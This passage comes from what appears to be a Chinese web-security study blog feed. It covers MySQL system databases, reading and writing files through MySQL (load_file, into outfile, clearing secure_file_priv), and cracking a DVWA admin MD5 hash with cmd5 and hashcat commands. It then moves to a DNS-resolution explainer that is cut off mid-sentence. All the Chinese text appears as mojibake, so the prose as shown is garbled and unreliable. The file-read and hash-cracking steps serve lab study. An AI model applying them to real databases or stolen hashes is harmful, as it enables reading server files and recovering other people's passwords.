serverä¸­çš„masterè¡¨ï¼Œä¸»è¦è´Ÿè´£å­˜å‚¨æ•°æ®åº“çš„ç”¨æˆ·ã€æƒé™è®¾ç½®ã€å…³é”®å­—ç­‰mysqlè‡ªå·±éœ€è¦ä½¿ç”¨çš„æ§åˆ¶å’Œç®¡ç†ä¿¡æ¯ã€‚ä¸å¯ä»¥åˆ é™¤ï¼Œå¦‚æœå¯¹mysqlä¸æ˜¯å¾ˆäº†è§£ï¼Œä¹Ÿä¸è¦è½»æ˜“ä¿®æ”¹è¿™ä¸ªæ•°æ®åº“é‡Œé¢çš„è¡¨ä¿¡æ¯ã€‚</p><h2 id="performance-schema"><a href="#performance-schema" class="headerlink" title="performance_schema"></a>performance_schema</h2><p>MySQL 5.5å¼€å§‹æ–°å¢ä¸€ä¸ªæ•°æ®åº“ï¼šPERFORMANCE_SCHEMAï¼Œä¸»è¦ç”¨äºæ”¶é›†æ•°æ®åº“æœåŠ¡å™¨æ€§èƒ½å‚æ•°ã€‚å¹¶ä¸”åº“é‡Œè¡¨çš„å­˜å‚¨å¼•æ“PERFORMANCE_SCHEMAï¼Œè€Œç”¨æˆ·æ˜¯ä¸èƒ½åˆ›å»ºå­˜å‚¨å¼•æ“ä¸ºPERFORMANCE_SCHEMAçš„è¡¨ã€‚</p><h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><p>Sysåº“æ‰€æœ‰çš„æ•°æ®æºæ¥è‡ªï¼šperformance_schemaã€‚ç›®æ ‡æ˜¯æŠŠperformance_schemaçš„æŠŠå¤æ‚åº¦é™ä½ï¼Œè®©DBAèƒ½æ›´å¥½çš„é˜…è¯»è¿™ä¸ªåº“é‡Œçš„å†…å®¹ï¼Œè®©DBAæ›´å¿«çš„äº†è§£DBçš„è¿è¡Œæƒ…å†µã€‚ï¼ˆ<a href="https://blog.csdn.net/jayewu/article/details/80183274">è¯¦æƒ…</a>ï¼‰</p><h1 id="åˆ©ç”¨æ•°æ®åº“çš„åŠŸèƒ½è¯»å†™æ–‡ä»¶"><a href="#åˆ©ç”¨æ•°æ®åº“çš„åŠŸèƒ½è¯»å†™æ–‡ä»¶" class="headerlink" title="åˆ©ç”¨æ•°æ®åº“çš„åŠŸèƒ½è¯»å†™æ–‡ä»¶"></a>åˆ©ç”¨æ•°æ®åº“çš„åŠŸèƒ½è¯»å†™æ–‡ä»¶</h1><h2 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h2><p>ï¼ˆ1ï¼‰æ•°æ®åº“å…è®¸å¯¼å…¥å¯¼å‡ºï¼ˆsecure_file_privä¸ä¸ºNULLï¼‰</p><p>æŸ¥çœ‹æ•°æ®åº“æ˜¯å¦å¼€å¯å¯¼å…¥å¯¼å‡ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;secure_file_priv&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/cHQ8D7LdrBCN3Ea.png" alt="image-20201113225818984"></p><p>   è¯´æ˜ï¼šsecure_file_privæ˜¯ç”¨æ¥é™åˆ¶load_fileã€load dataå’Œselect  outfileæ“ä½œå“ªä¸ªæŒ‡å®šç›®å½•ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/yRk6KT1us85Jfhc.png" alt="img"></p><p>æˆ‘è¿™é‡Œé»˜è®¤æ˜¯ <strong>/var/lib/mysql-files</strong> ,å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ä¿®æ”¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure><p>åœ¨æœ€åæ·»åŠ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure file priv&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure><p>é‡å¯mysqlæœåŠ¡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysql restart</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å½“å‰ç”¨æˆ·çš„æ–‡ä»¶æ“ä½œæƒé™ï¼ˆFile_privï¼šYï¼‰</p><p>â€‹     æŸ¥çœ‹å½“å‰ç”¨æˆ·æ˜¯å¦å…·æœ‰æ–‡ä»¶è¯»å†™æƒé™ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select File_priv from mysql.user where user&#x3D;&#39;root&#39; and host &#x3D;&#39;localhost&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/rQJSMWpgFqEn2P4.png" alt="image-20201113230842289"></p><h2 id="è¯»æ–‡ä»¶ï¼ˆmysqlå¯¼å…¥æ•°æ®ï¼‰"><a href="#è¯»æ–‡ä»¶ï¼ˆmysqlå¯¼å…¥æ•°æ®ï¼‰" class="headerlink" title="è¯»æ–‡ä»¶ï¼ˆmysqlå¯¼å…¥æ•°æ®ï¼‰"></a>è¯»æ–‡ä»¶ï¼ˆmysqlå¯¼å…¥æ•°æ®ï¼‰</h2><p><strong>(1)load_file()</strong></p><p><strong>(2)load data infile()</strong></p><p><strong>(3)system cat</strong></p><p>load_file()å’Œload data infileè¯»å–æ–‡ä»¶çš„æ–¹æ³•ä¸º:æ–°å»ºä¸€ä¸ªè¡¨ï¼Œè¯»å–æ–‡ä»¶ä¸ºå­—ç¬¦ä¸²å½¢å¼æ’å…¥è¡¨ä¸­ï¼Œç„¶åè¯»å‡ºè¡¨ä¸­æ•°æ®ã€‚</p><p>system catååŠ æ–‡ä»¶è·¯å¾„ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/U3DF2m1LXbCo7Zt.png" alt="image-20201113233615626"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ZAuskmMVWpbHn75.png" alt="image-20201113234015997"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201113234210769.png" alt="image-20201113234210769"></p><h2 id="å†™æ–‡ä»¶-mysqlå¯¼å‡ºæ•°æ®"><a href="#å†™æ–‡ä»¶-mysqlå¯¼å‡ºæ•°æ®" class="headerlink" title="å†™æ–‡ä»¶  (mysqlå¯¼å‡ºæ•°æ®)"></a>å†™æ–‡ä»¶  (mysqlå¯¼å‡ºæ•°æ®)</h2><p><strong>select â€˜   â€˜ into outfile</strong> </p><p>å¦‚ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/lCJvISb6Pezq8oE.png" alt="image-20201113234946913"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/yZDH4EV6ABao7OL.png" alt="image-20201113235046444"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/HZCNgiT9StwEM61.png" alt="image-20201114184126130"></p><h1 id="hashç›¸å…³"><a href="#hashç›¸å…³" class="headerlink" title="hashç›¸å…³"></a>hashç›¸å…³</h1><h2 id="æŸ¥è¯¢ç”¨æˆ·hash"><a href="#æŸ¥è¯¢ç”¨æˆ·hash" class="headerlink" title="æŸ¥è¯¢ç”¨æˆ·hash"></a>æŸ¥è¯¢ç”¨æˆ·hash</h2><p>ç›®æ ‡ï¼šdvwaçš„adminç”¨æˆ·çš„password</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/x9OkDFblViRWqjU.png" alt="image-20201115110152189"></p><p><a href="https://www.cmd5.com/">ç ´è§£</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/2kzlbPJABgNnKGW.png" alt="image-20201115110328511"></p><h2 id="ä½¿ç”¨-hashcat-æ¥å¯¹è·å–çš„-hash-è¿›è¡Œæš´åŠ›ç ´è§£"><a href="#ä½¿ç”¨-hashcat-æ¥å¯¹è·å–çš„-hash-è¿›è¡Œæš´åŠ›ç ´è§£" class="headerlink" title="ä½¿ç”¨ hashcat æ¥å¯¹è·å–çš„ hash è¿›è¡Œæš´åŠ›ç ´è§£"></a>ä½¿ç”¨ hashcat æ¥å¯¹è·å–çš„ hash è¿›è¡Œæš´åŠ›ç ´è§£</h2><p><a href="https://hashcat.net/hashcat/">ä¸‹è½½hashcat</a></p><p>åœ¨hashcatæ–‡ä»¶å¤¹æ–°å»º</p><p>hash.txt(ä¿å­˜è¦ç ´è§£çš„hashå€¼)</p><p>password.txt(ä¿å­˜å¯†ç å­—å…¸)</p><p>ä½¿ç”¨cmdè¿›å…¥hashcatæ‰€åœ¨ç›®å½•,ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œç ´è§£ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 0 hash.txt password.txt</span><br></pre></td></tr></table></figure><p>-a 0 ä»£è¡¨ä½¿ç”¨å­—å…¸ç ´è§£æ¨¡å¼</p><p>-m 0 ä»£è¡¨Hash Typeä¸ºmd5</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/V2fysUPHAidRWc4.png" alt="image-20201115113529889"></p><p>ç»“æœï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/yW5AYkZS4PwIJmu.png" alt="image-20201115113724632"></p><p>ç ´è§£è®°å½•åœ¨hashcat.potfileæ–‡ä»¶ä¸­å¯æŸ¥</p><p>æˆ–å¯ç›´æ¥<strong>ä½¿ç”¨å­—å…¸è¿›è¡Œç ´è§£</strong>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 5f4dcc3b5aa765d61d8327deb882cf99 password.txt</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/SJh5OiLlT92MH7X.png" alt="image-20201115114500987"></p><p>ç»“æœä¸€è‡´ã€‚</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://blog.csdn.net/weixin_33991418/article/details/89744955">å®‰è£…åˆå§‹åŒ–mysqlåï¼Œé»˜è®¤å‡ ä¸ªåº“ä»‹ç»</a></p><p>[2] <a href="https://blog.csdn.net/WYJ____/article/details/81234382?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param">SQLæ³¨å…¥è¯»å†™æ–‡ä»¶</a></p><p>[3] <a href="https://blog.csdn.net/qq_34981272/article/details/99337529">æ•°æ®åº“ç³»ç»Ÿè¡¨ç›¸å…³å­¦ä¹ </a></p><p>[4] <a href="https://blog.csdn.net/smli_ng/article/details/106111493">hashcatè¯¦ç»†ä½¿ç”¨æ•™ç¨‹</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨å­¦ä¹  </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webé¡µé¢è§£ææµç¨‹çš„å­¦ä¹ </title>
      <link href="posts/671.html"/>
      <url>posts/671.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>WEB é¡µé¢è§£æçš„æ€»ä½“æµç¨‹</p><p>å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰å‘èµ·é¡µé¢è¯·æ±‚ï¼Œä¸»æœºå¯¹ åœ°å€ä¸­çš„DNS åŸŸåè¿›è¡Œè§£æï¼Œæ‰¾åˆ°å¯¹åº”çš„ IP åœ°å€ï¼Œè¯·æ±‚å‘é€åˆ° æœåŠ¡ç«¯ï¼ŒæœåŠ¡å™¨æ ¹æ®è¯·æ±‚å†…å®¹å‘é€å“åº”ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯æ”¶åˆ°å“åº”ï¼Œå°†å†…å®¹æ¸²æŸ“æˆç½‘é¡µã€‚</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201222181119855.png" alt="image-20201222181119855"></p><h1 id="åŸŸåè§£æçš„è¿‡ç¨‹"><a href="#åŸŸåè§£æçš„è¿‡ç¨‹" class="headerlink" title="åŸŸåè§£æçš„è¿‡ç¨‹"></a>åŸŸåè§£æçš„è¿‡ç¨‹</h1><h2 id="åè¯è§£é‡Š"><a href="#åè¯è§£é‡Š" class="headerlink" title="åè¯è§£é‡Š"></a>åè¯è§£é‡Š</h2><p>(1) <strong>åŸŸå</strong>ï¼šç½‘ç»œæ˜¯åŸºäºTCP/IPåè®®è¿›è¡Œé€šä¿¡å’Œè¿æ¥çš„ï¼Œæ¯ä¸€å°ä¸»æœºéƒ½æœ‰å”¯ä¸€ä¸”å›ºå®šçš„IPåœ°å€ï¼Œä»è€ŒåŒºåˆ†å› ç‰¹ç½‘ä¸Šæ•°é‡åºå¤§çš„ä¸»æœºã€‚IPåœ°å€æ˜¯æ•°å­—å‹çš„ï¼Œæ•°å­—è¾ƒå¤šä¸æ–¹ä¾¿è®°å¿†ï¼Œäºæ˜¯äººä»¬åˆå‘æ˜äº†åŸŸååœ°å€ï¼Œé‡‡ç”¨å­—ç¬¦å‹ç»“æ„ã€‚åŸŸååœ°å€æ˜¯åŸŸçš„è‡ªç„¶è¯­è¨€åç§°ï¼Œå®ƒä¸æ•°å­—å¼IPåœ°å€å­˜åœ¨ä¸€ä¸€å¯¹åº”çš„å…³ç³»ã€‚IPåœ°å€å¦‚åŒç”µè„‘çš„èº«ä»½è¯å·ç ï¼Œè€ŒåŸŸååœ°å€åˆ™ç›¸å½“äºç”µè„‘çš„å§“åï¼Œæ–¹ä¾¿äººä»¬è®°å¿†å’Œä½¿ç”¨ã€‚åŸŸåä¸€èˆ¬ç”±ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„è¯æ„æˆï¼Œä¸­é—´ç”¨â€œ.â€è¿›è¡Œåˆ†éš”ï¼Œå…¶ç»“æ„æ˜¯ï¼šå››çº§åŸŸå.ä¸‰çº§åŸŸå.äºŒçº§åŸŸå.ä¸€çº§åŸŸåã€‚</p><p>(2) <strong>DNS</strong>ï¼š<strong>åŸŸåç³»ç»Ÿ</strong>ï¼ˆè‹±è¯­ï¼š<strong>D</strong>omain <strong>N</strong>ame <strong>S</strong>ystemï¼Œç¼©å†™ï¼š<strong>DNS</strong>ï¼‰æ˜¯äº’è”ç½‘çš„ä¸€é¡¹æœåŠ¡ã€‚å®ƒä½œä¸ºå°†åŸŸåå’ŒIPåœ°å€ç›¸äº’æ˜ å°„çš„ä¸€ä¸ªåˆ†å¸ƒå¼æ•°æ®åº“ï¼Œèƒ½å¤Ÿä½¿äººæ›´æ–¹ä¾¿åœ°è®¿é—®äº’è”ç½‘ã€‚DNSä½¿ç”¨TCPå’ŒUDPç«¯å£53ã€‚å½“å‰ï¼Œå¯¹äºæ¯ä¸€çº§åŸŸåé•¿åº¦çš„é™åˆ¶æ˜¯63ä¸ªå­—ç¬¦ï¼ŒåŸŸåæ€»é•¿åº¦åˆ™ä¸èƒ½è¶…è¿‡253ä¸ªå­—ç¬¦ã€‚</p><p><strong>DNS æœåŠ¡å™¨çš„åˆ†å±‚ç»“æ„</strong></p><p>DNS æœåŠ¡å™¨é‡‡ç”¨åˆ†å¸ƒå¼ã€åˆ†å±‚çš„æ–¹å¼éƒ¨ç½²åœ¨ä¸–ç•Œå„åœ°ã€‚æŒ‰ç…§å±‚çº§ä»é«˜åˆ°ä½ï¼ŒDNS æœåŠ¡å™¨åˆ†ä¸ºï¼š<code>æ ¹åŸŸåæœåŠ¡å™¨</code>ï¼ˆRoot DNS Serversï¼‰ã€<code>é¡¶çº§åŸŸåæœåŠ¡å™¨</code>ï¼ˆTLD DNS Serversï¼‰ã€<code>æƒå¨åŸŸåæœåŠ¡å™¨</code>ï¼ˆAuthoritative DNS Serversï¼‰ï¼Œå±‚çº§å…³ç³»å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201222181259372.png" alt="image-20201222181259372"></p><ul><li><code>æ ¹åŸŸåæœåŠ¡å™¨</code>ï¼šä¸–ç•Œä¸Šæœ‰ 13 ä¸ª <code>æ ¹åŸŸåæœåŠ¡å™¨</code>ï¼Œå‡†ç¡®æ¥è¯´æ˜¯ 13 ç»„æœåŠ¡å™¨ç¾¤ç»„ï¼ŒæœåŠ¡å™¨ç»„ä¸­çš„æ¯ä¸€ä¸ª<code>æ ¹åŸŸåæœåŠ¡å™¨</code>éƒ½æœ‰æ‰€æœ‰<code>é¡¶çº§åŸŸåæœåŠ¡å™¨</code>ï¼ˆcom, org, gov â€¦ï¼‰çš„ IP åœ°å€ã€‚</li><li><code>é¡¶çº§åŸŸåæœåŠ¡å™¨</code>ï¼šä¸ºé¡¶çº§åŸŸåå¦‚ comã€orgã€net ç­‰æä¾›åŸŸåè§£ææœåŠ¡ï¼Œæ¯ä¸€ä¸ªé¡¶çº§åŸŸåéƒ½æœ‰ç›¸åº”çš„ <code>é¡¶çº§åŸŸåæœåŠ¡å™¨</code>ï¼Œå­˜æ”¾å…¶æ‰€æœ‰å­åŸŸåçš„ IP åœ°å€ã€‚</li><li><code>æƒå¨åŸŸåæœåŠ¡å™¨</code>ï¼šå„ç§ç»„ç»‡æœºæ„ï¼Œå¦‚ä¼ä¸šã€å­¦æ ¡ã€æ”¿åºœç»„ç»‡ç­‰éƒ½éœ€ä¸ºå…¶æä¾›ç½‘ç»œæœåŠ¡çš„ä¸»æœºå–ä¸€ä¸ªåˆé€‚çš„åŸŸåï¼Œå¦‚ ç™¾åº¦å…¬å¸çš„ baidu.comï¼Œè€Œä¸»æœºçš„ IP åœ°å€å’ŒåŸŸåçš„å¯¹åº”å…³ç³»å°±ä¿å­˜è‡³å…¶<code>æƒå¨åŸŸåæœåŠ¡å™¨</code>ä¸­ã€‚ä¸€èˆ¬å¤§å…¬å¸å’Œå­¦æ ¡éƒ½ä¼šéƒ¨ç½²è‡ªå·±çš„<code>æƒå¨åŸŸåæœåŠ¡å™¨</code>ã€‚</li></ul><p>(3) <strong>åŸŸåè§£æ</strong>ï¼šå³åŸŸååˆ°IPåœ°å€çš„è½¬æ¢è¿‡ç¨‹ã€‚åŸŸåçš„è§£æå·¥ä½œç”±DNSæœåŠ¡å™¨å®Œæˆã€‚DNSæŸ¥è¯¢æœ‰ä¸¤ç§æ–¹å¼ï¼š<strong>é€’å½’</strong>å’Œ<strong>è¿­ä»£</strong>ã€‚DNSå®¢æˆ·ç«¯è®¾ç½®ä½¿ç”¨çš„DNSæœåŠ¡å™¨ä¸€èˆ¬éƒ½æ˜¯é€’å½’æœåŠ¡å™¨ï¼Œå®ƒè´Ÿè´£å…¨æƒå¤„ç†å®¢æˆ·ç«¯çš„DNSæŸ¥è¯¢è¯·æ±‚ï¼Œç›´åˆ°è¿”å›æœ€ç»ˆç»“æœã€‚è€ŒDNSæœåŠ¡å™¨ä¹‹é—´ä¸€èˆ¬é‡‡ç”¨è¿­ä»£æŸ¥è¯¢æ–¹å¼ã€‚</p><p><strong>é€’å½’æŸ¥è¯¢</strong>ï¼šæœ¬æœºå‘æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘å‡ºä¸€æ¬¡æŸ¥è¯¢è¯·æ±‚ï¼Œå°±é™å¾…æœ€ç»ˆçš„ç»“æœã€‚å¦‚æœæœ¬åœ°åŸŸåæœåŠ¡å™¨æ— æ³•è§£æï¼Œè‡ªå·±ä¼šä»¥DNSå®¢æˆ·æœºçš„èº«ä»½å‘å…¶å®ƒåŸŸåæœåŠ¡å™¨æŸ¥è¯¢ï¼Œç›´åˆ°å¾—åˆ°æœ€ç»ˆçš„IPåœ°å€å‘Šè¯‰æœ¬æœºã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/DNS%E9%80%92%E5%BD%92%E6%9F%A5%E8%AF%A2%E5%AE%9E%E4%BE%8B.jpg"></p><p><strong>è¿­ä»£æŸ¥è¯¢</strong>ï¼šæœ¬åœ°åŸŸåæœåŠ¡å™¨å‘æ ¹åŸŸåæœåŠ¡å™¨æŸ¥è¯¢ï¼Œæ ¹åŸŸåæœåŠ¡å™¨å‘Šè¯‰å®ƒä¸‹ä¸€æ­¥åˆ°å“ªé‡Œå»æŸ¥è¯¢ï¼Œç„¶åå®ƒå†å»æŸ¥ï¼Œæ¯æ¬¡å®ƒéƒ½æ˜¯ä»¥å®¢æˆ·æœºçš„èº«ä»½å»å„ä¸ªæœåŠ¡å™¨æŸ¥è¯¢ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/DNS%E8%BF%AD%E4%BB%A3%E6%9F%A5%E8%AF%A2%E5%AE%9E%E4%BE%8B.jpg"></p><h2 id="æµç¨‹ä»‹ç»"><a href="#æµç¨‹ä»‹ç»" class="headerlink" title="æµç¨‹ä»‹ç»"></a>æµç¨‹ä»‹ç»</h2><p>(1) <strong>æµè§ˆå™¨è¾“å…¥åŸŸåä¹‹åï¼Œé¦–å…ˆä¼šæ£€æŸ¥æµè§ˆå™¨ç¼“å­˜ä¸­æ˜¯å¦ç¼“å­˜è¿‡è¯¥åŸŸåå¯¹åº”çš„IPåœ°å€</strong></p><p>ç”¨æˆ·é€šè¿‡æµè§ˆå™¨æµè§ˆè¿‡æŸç½‘ç«™ä¹‹åï¼Œæµè§ˆå™¨å°±ä¼šè‡ªåŠ¨ç¼“å­˜è¯¥ç½‘ç«™åŸŸåå¯¹åº”çš„åœ°å€ï¼Œå½“ç”¨æˆ·å†æ¬¡è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨å°±ä¼šä»ç¼“å­˜ä¸­æŸ¥æ‰¾è¯¥åŸŸåå¯¹åº”çš„IPåœ°å€ï¼Œå› ä¸ºç¼“å­˜ä¸ä»…æ˜¯æœ‰å¤§å°é™åˆ¶ï¼Œè€Œä¸”è¿˜æœ‰æ—¶é—´é™åˆ¶ï¼ˆåŸŸåè¢«ç¼“å­˜çš„æ—¶é—´é€šè¿‡å±æ€§æ¥è®¾ç½®ï¼‰ï¼Œæ‰€ä»¥å­˜åœ¨åŸŸåå¯¹åº”çš„æ‰¾ä¸åˆ°çš„æƒ…å†µã€‚å½“æµè§ˆå™¨ä»ç¼“å­˜ä¸­æ‰¾åˆ°äº†è¯¥ç½‘ç«™åŸŸåå¯¹åº”çš„åœ°å€ï¼Œé‚£ä¹ˆæ•´ä¸ªè§£æè¿‡ç¨‹ç»“æŸï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œå°†è¿›è¡Œä¸‹ä¸€æ­¥éª¤ã€‚å¯¹äºçš„ç¼“å­˜æ—¶é—´é—®é¢˜ï¼Œä¸å®œè®¾ç½®å¤ªé•¿çš„ç¼“å­˜æ—¶é—´ï¼Œæ—¶é—´å¤ªé•¿ï¼Œå¦‚æœåŸŸåå¯¹åº”çš„å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆç”¨æˆ·å°†åœ¨ä¸€æ®µæ—¶é—´å†…æ— æ³•æ­£å¸¸è®¿é—®åˆ°ç½‘ç«™ï¼Œå¦‚æœå¤ªçŸ­ï¼Œé‚£ä¹ˆåˆé€ æˆé¢‘ç¹è§£æåŸŸåã€‚</p><p>(2) <strong>å¦‚æœåœ¨æµè§ˆå™¨ç¼“å­˜ä¸­æ²¡æœ‰æ‰¾åˆ°IPï¼Œé‚£ä¹ˆå°†ç»§ç»­æŸ¥æ‰¾æœ¬æœºç³»ç»Ÿæ˜¯å¦ç¼“å­˜è¿‡IP</strong></p><p>å¦‚æœç¬¬ä¸€ä¸ªæ­¥éª¤æ²¡æœ‰å®Œæˆå¯¹åŸŸåçš„è§£æè¿‡ç¨‹ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šå»ç³»ç»Ÿç¼“å­˜ä¸­æŸ¥æ‰¾ç³»ç»Ÿæ˜¯å¦ç¼“å­˜è¿‡è¿™ä¸ªåŸŸåå¯¹åº”çš„åœ°å€ã€‚å…¶å®æ“ä½œç³»ç»Ÿä¹Ÿæœ‰ä¸€ä¸ªåŸŸåè§£æçš„è¿‡ç¨‹ï¼Œé€šè¿‡<strong>hostsæ–‡ä»¶</strong>è®¾ç½®ï¼Œç”¨æˆ·å¯ä»¥å°†ä»»ä½•åŸŸåè§£æåˆ°ä»»ä½•èƒ½å¤Ÿè®¿é—®çš„IPåœ°å€ã€‚æ­£æ˜¯å› ä¸ºæœ‰è¿™ç§æœ¬åœ°DNSè§£æçš„è§„ç¨‹ï¼Œæ‰€ä»¥æœ‰é»‘å®¢å°±å¯èƒ½é€šè¿‡ä¿®æ”¹ç”¨æˆ·çš„åŸŸåæ¥æŠŠç‰¹å®šçš„åŸŸåè§£æåˆ°ä»–æŒ‡å®šçš„IPåœ°å€ä¸Šï¼Œå¯¼è‡´è¿™äº›åŸŸåè¢«åŠ«æŒã€‚</p><p>(3) <strong>å‘æœ¬åœ°åŸŸåè§£ææœåŠ¡ç³»ç»Ÿå‘èµ·åŸŸåè§£æçš„è¯·æ±‚</strong></p><p>ä»¥ä¸Šä¸¤æ­¥çš„è§£ææ˜¯åœ¨æœ¬æœºä¸Šå®Œæˆçš„ï¼Œå¦‚æœæœ¬æœºæ— æ³•è§£æåŸŸåï¼Œé‚£ä¹ˆç³»ç»Ÿåªèƒ½è¯·æ±‚æœ¬åœ°åŸŸåè§£ææœåŠ¡ç³»ç»Ÿè¿›è¡Œè§£æï¼Œæœ¬åœ°åŸŸåç³»ç»Ÿä¸€èˆ¬éƒ½æ˜¯æœ¬åœ°åŒºçš„åŸŸåæœåŠ¡å™¨ï¼Œæ¯”å¦‚ä½ è¿æ¥çš„æ ¡å›­ç½‘ï¼Œé‚£ä¹ˆåŸŸåè§£æç³»ç»Ÿå°±åœ¨ä½ çš„æ ¡å›­æœºæˆ¿é‡Œï¼Œå¦‚æœä½ è¿æ¥çš„æ˜¯ç”µä¿¡ã€ç§»åŠ¨æˆ–è€…è”é€šçš„ç½‘ç»œï¼Œé‚£ä¹ˆæœ¬åœ°åŸŸåè§£ææœåŠ¡å™¨å°±åœ¨æœ¬åœ°åŒºï¼Œç”±å„è‡ªçš„è¿è¥å•†æ¥æä¾›æœåŠ¡ã€‚å¯¹äºæœ¬åœ°åŸŸåè§£ææœåŠ¡å™¨ï¼Œä¸€èˆ¬éƒ½ç¼“å­˜äº†åœ°åŒºå†…éƒ¨åŸŸåè§£æè¯·æ±‚çš„ç»“æœï¼Œå¦‚æœç¼“å­˜å‘½ä¸­åˆ™è¿”å›ç›¸åº”çš„ç»“æœï¼Œå½“ç„¶ç¼“å­˜æ—¶é—´ä¹Ÿå—åŸŸåå¤±æ•ˆæ—¶é—´æ§åˆ¶ã€‚å¤§çº¦80%çš„åŸŸåè§£æåˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œæ‰€ä»¥æœ¬åœ°åŸŸåè§£æç³»ç»Ÿä¸»è¦æ‰¿æ‹…äº†åŸŸåçš„è§£æå·¥ä½œã€‚</p><p>(4) <strong>å‘æ ¹åŸŸåè§£ææœåŠ¡å™¨å‘èµ·åŸŸåè§£æè¯·æ±‚</strong></p><p>å¦‚æœæœ¬åœ°åŸŸåè§£æç³»ç»Ÿçš„ç¼“å­˜ä¸­æ²¡æœ‰æ‰€éœ€è¦æŸ¥æ‰¾åˆ°åŸŸåï¼Œåˆ™å°†ä¼šå‘æ ¹åŸŸåæœåŠ¡å™¨å‘èµ·è§£æè¯·æ±‚ã€‚</p><p>(5) <strong>æ ¹åŸŸåæœåŠ¡å™¨è¿”å›ç»™æœ¬åœ°åŸŸåæœåŠ¡å™¨ä¸€ä¸ªæ‰€æŸ¥è¯¢çš„ä¸»åŸŸåæœåŠ¡å™¨ï¼ˆgTLD Serverï¼‰åœ°å€</strong></p><p>æ ¹åŸŸåæ˜¯ä¸è´Ÿè´£è§£æåŸŸåçš„ï¼Œå®ƒåªè´Ÿè´£ç®¡ç†æ‰€æœ‰çš„é¡¶çº§åŸŸåã€‚æ¯”å¦‚ï¼šä½ è¦è§£æçš„ç½‘å€æ˜¯ï¼š<em><a href="http://www.xxx.com/">www.xxx.com</a></em>ï¼Œæ ¹åŸŸåæœåŠ¡å™¨æ˜¯ä¸çŸ¥é“è¿™ä¸ªåŸŸåçš„IPåœ°å€çš„ï¼Œä½†æ˜¯å®ƒçŸ¥é“è¿™ä¸ªIPåœ¨å®ƒç®¡ç†çš„<code>.com</code>åŸŸåä¸‹ï¼Œæ ¹åŸŸåæœåŠ¡å™¨ä¼šå‘è¯·æ±‚æ–¹å‘é€<code>.com</code>åŸŸåæœåŠ¡å™¨çš„åœ°å€ï¼Œå¼•å¯¼è¯·æ±‚æ–¹ç»§ç»­æŸ¥è¯¢ã€‚</p><p>(6) <strong>æœ¬åœ°åŸŸåæœåŠ¡å™¨LDNSå†å‘ä¸Šä¸€æ­¥è¿”å›çš„gTLDæœåŠ¡å™¨å‘é€è¯·æ±‚</strong></p><p>å› 